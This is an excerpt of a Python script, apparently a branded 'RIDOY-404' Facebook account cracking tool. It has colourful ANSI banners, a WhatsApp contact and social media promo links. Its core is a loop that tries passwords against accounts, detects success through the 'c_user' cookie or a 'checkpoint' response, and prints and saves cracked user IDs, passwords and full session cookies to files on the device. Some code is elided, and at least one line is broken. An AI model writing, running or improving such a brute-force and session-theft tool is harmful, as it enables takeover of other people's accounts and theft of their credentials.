...
\033[1;32m║══════════════════════════════════║║  \x1b[1;93m┃╭╮╭╯┃┃┃╭━━┻━━╮┃╱┃┃\033[1;32m   ║
\033[1;32m║WHATSAPP  : +8801788181192       ║║  \x1b[1;91m┃┃┃╰┳╯╰┫┃╱╱╱╱╱┃┃╱┃┃\033[1;32m    ║
\033[1;32m║══════════════════════════════════║║  \x1b[1;93m╰╯╰━┻━━┻╯╱╱╱╱╱╰╯╱╰╯\033[1;32m   ║
...
def ud():
    ...
    if opt == '1':
        os.system('xdg-open https://https://www.youtube.com/@yt--gamer--9995')
        FD()
        return None
...
def FD():
    ...
    if opt == '1':
        os.system('xdg-open https://https://www.facebook.com/profile.php?id=100068378304193&mibextid=ZbWKwL')
        o()
        return None
    None('\n\x1b[1;31mEXIT\x1b[0;97m')
...
def o():
    ...
    if opt == '1':
        i()
    if opt == '2':
        os.system('xdg-open https://tiktok.com/@ridoykhan5406')
        return None
    if opt == '3':
        os.system('xdg-open https://https://www.youtube.com/@yt--gamer--9995')
        return None
...
today = date.today()
logo = ("""\033[132m
  _____  _____ _____   ______     ___  _    ___  _  _   
 |  __ \|_   _|  __ \ / __ \ \   / / || |  / _ \| || |  
 | |__) | | | | |  | | |  | \ \_/ /| || |_| | | | || |_ 
 |  _  /  | | | |  | | |  | |\   / |__   _| | | |__   _|
 | | \ \ _| |_| |__| | |__| | | |     | | | |_| |  | |  
 |_|  \_\_____|_____/ \____/  |_|     |_|  \___/   |_|  
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m[RIDOY-404-OK]  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/RIDOY-404-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m[RIDOY-404-CP] ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/RIDOY-404-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write(' %s[RIDOY-404] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
